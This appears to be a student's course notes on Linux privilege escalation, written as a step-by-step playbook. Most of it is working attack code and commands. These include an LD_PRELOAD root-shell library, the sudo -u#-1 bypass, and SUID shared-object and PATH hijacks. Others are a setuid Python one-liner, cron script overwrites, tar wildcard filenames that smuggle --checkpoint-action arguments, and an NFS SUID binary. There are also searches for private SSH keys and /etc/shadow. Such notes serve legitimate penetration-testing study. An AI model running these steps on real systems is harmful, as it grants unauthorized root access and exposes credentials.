# Password & File Permissions

One of the first things to check is the command history using:

```shell
history
```

It's essential to check for access to critical files such as `/etc/passwd` and `/etc/shadow`.

```
ls -la /etc/passwd /etc/shadow
```

# Escalation via SSH Keys

To locate SSH keys on the target system, we executed the following commands:

```shell
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```

# Sudo Escalation Path

Check if we can run any command as root or any other user

```bash
sudo -l
```

To identify potential privilege escalation paths via sudo, we can refer to [GTFOBins](https://gtfobins.github.io/), a resource that details various methods for exploiting programs.If a program is not listed on GTFOBins, we can always search online to explore any intended functionalities that may allow privilege escalation.

# Escalation via LD_PRELOAD

One common vulnerability occurs when the `LD_PRELOAD` variable is visible in the output of `sudo -l`.

[![LD_PRELOAD Variable](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/22.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/22.png)

To exploit this, we can write a simple C program to spawn a shell:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");   
}
```

After compiling the program with the following command:

```shell
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

We can then load `shell.so` as `LD_PRELOAD` to gain root access by executing any command that can run with root privileges:

```shell
sudo LD_PRELOAD=/home/user/shell.so apache2
```
## Vulnerability Related to [(ALL, !root) /bin/bash]

In cases where we cannot explicitly run `/bin/bash` as root, there exists an exploit detailed in [Exploit DB](https://www.exploit-db.com/exploits/47502).

When running `sudo -l`, we observed the following permissions:

```shell
User hacker may run the following commands on kali:
    (ALL, !root) /bin/bash
```

This indicates that the user `hacker` can execute `/bin/bash` with sudo, but not directly as root. To exploit this, we can use the following command:

```shell
sudo -u#-1 /bin/bash
```

# Escalation path with SUID

Command to find all executable with SUID for this user

```shell
find / -perm -u=s -type f 2> /dev/null
find / -perm -04000 -ls 2> /dev/null
```

# Shared Object Injection

strace /usr/local/bin/suid-so 2&>1 | grep -i -E "open|access|no such file"

[![Privilege Escalation](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/31.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/31.png)
Malicious code

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        system("cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p");
}
```

[![Privilege Escalation](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/32.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/32.png)

```shell
gcc -shared -fPIC -o /home/user/.config/libcalc.so libcal.c 
```

[![Privilege Escalation](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/33.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/33.png)
# Escalation via Environmental Variable

To look at enviromnetal variable

```shell
env
```

[![Privilege Escalation](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/34.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/34.png)
[![Privilege Escalation](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/34.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/34.png)
```shell
strings /usr/local/bin/suid-env
```

[![Privilege Escalation](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/36.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/36.png)
```shell
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
```

After

```shell
export PATH=/tmp:$PATH
```

/usr/local/bin/suid-env

[![Privilege Escalation](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/35.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/35.png)
This works if the command dont call the executableby the full path , but if a executable is called but a full path like this

[![Privilege Escalation](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/37.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/37.png)

We need to do another thing

```shell
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }

export -f /usr/sbin/service
```

[![Privilege Escalation](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/38.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/38.png)
And like this we can get a shell as the SUID user
# Privilege Escalation via Capabilities

To search for files with capabilities, use the following command:

```shell
getcap -r / 2> /dev/null
```

Look for files with the `+ep` flag:

[![Privilege Escalation](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/39.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/39.png)

You can exploit such files by running this command:

```shell
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

[![Privilege Escalation](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/40.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/40.png)
# Privilege Escalation through Scheduled Tasks

To view cron jobs, you can use the following command:

```shell
cat /etc/crontab
```

[![Privilege Escalation](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/41.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/41.png)
Additionally, you can list systemd timers using:

```shell
systemctl list-timers --all
```

## Escalation via Cron Path Manipulation

In the output of `cat /etc/crontab`, you might notice a `PATH` variable where the first directory it searches is `/home/user`. If it doesn’t find the required script there, it moves on to the next directory:

[![Privilege Escalation](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/42.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/42.png)
To exploit this, we can hijack a script, such as `overwrite.sh`, as follows:

```shell
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
```

Once that’s done, you can execute the newly created `bash` file in the `/tmp` directory with the following command:

```shell
/tmp/bash -p
```

[![Privilege Escalation](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/43.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/43.png)

## Escalation via Cron Wildcards

For this example, we will use `tar` as specified in the `/etc/crontab` file:

[![Privilege Escalation](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/44.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/44.png)

To exploit this vulnerability, execute the following commands:

```shell
echo 'cp /bin/bash /tmp/bash3; chmod +s /tmp/bash3' > /home/user/runme.sh
chmod +x /home/user/runme.sh
touch '/home/user/--checkpoint=1'
touch '/home/user/--checkpoint-action=exec=sh runme.sh'

/tmp/bash3 -p
```

[![Privilege Escalation](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/45.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/45.png)

## Privilege Escalation via File Overwrite

If we have permission to overwrite a crontab task, such as the one shown below:

[![Privilege Escalation](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/42.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/42.png)
[![Privilege Escalation](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/46.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/46.png)
We can exploit this by using a similar method to the previous examples to gain root access. Here’s the command to modify the `overwrite.sh` script:

```shell
echo 'cp /bin/bash /tmp/bash4; chmod +s /tmp/bash4' >> /usr/local/bin/overwrite.sh
```

[![Privilege Escalation](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/47.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/47.png)
# Privilege Escalation via NFS Root Squashing

To determine if a system is vulnerable to NFS root squashing, check the contents of the `/etc/exports` file:

[![Root Access](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/58.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/58.png)
From the attacker’s machine, you can list the shared folders using:

```shell
showmount -e [IP]
```

[![Root Access](https://github.com/M1st3r3/CyberSec_Journey/raw/main/TCM-Academy/Lin_Priv_Esca/Image/59.png)](https://github.com/M1st3r3/CyberSec_Journey/blob/main/TCM-Academy/Lin_Priv_Esca/Image/59.png)

Next, mount the shared folder with the following commands:

```shell
mkdir /tmp/mount
mount -o rw,vers=2 10.10.158.65:/tmp /tmp/mount
```

Once mounted, you can compile and set permissions on a new executable:

```shell
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/mount/x.c
gcc /tmp/mount/x.c -o /tmp/mount/x
chmod +s /tmp/mount/x
```

Finally, execute the compiled binary on the victim’s machine to obtain a root shell:

```shell
/tmp/x
```

This method leverages NFS root squashing to escalate privileges.

